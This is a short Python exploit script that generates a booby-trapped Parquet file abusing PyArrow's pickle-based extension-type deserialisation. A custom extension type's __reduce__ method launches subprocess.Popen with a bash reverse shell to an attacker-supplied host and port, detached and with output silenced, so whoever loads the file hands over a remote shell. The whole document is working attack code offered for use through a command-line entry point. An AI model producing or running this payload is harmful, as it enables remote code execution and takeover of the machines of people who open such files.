import functools
import subprocess
from typing import List

import fire
import pyarrow as pa
import pyarrow.parquet as pq


# Simple bash reverse shell
REVSHELL_PAYLOAD = [
    "bash",
    "-c",
    "0<&51-;exec 51<>/dev/tcp/{LHOST}/{LPORT};sh <&51 >&51 2>&51"
]


class MaliciousStringType(pa.PyExtensionType):
    def __init__(self, payload: List[str]):
        self._payload = payload
        pa.PyExtensionType.__init__(self, pa.string())

    def __reduce__(self):
        return (
            functools.partial(
                subprocess.Popen,
                start_new_session=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            ),
            (self._payload, ),
            1
        )


def generate_malicious_parquet(lhost: str, lport: int, output_file: str = 'malicious.parquet'):
    REVSHELL_PAYLOAD[2] = REVSHELL_PAYLOAD[2].format(LHOST=lhost, LPORT=lport)
    table = pa.Table.from_arrays(
        [
            pa.array([], pa.int64()),
            pa.array([], MaliciousStringType(REVSHELL_PAYLOAD))
        ],
        names=["id", "name"]
    )
    pq.write_table(table, output_file)


if __name__ == "__main__":
    fire.Fire(generate_malicious_parquet)
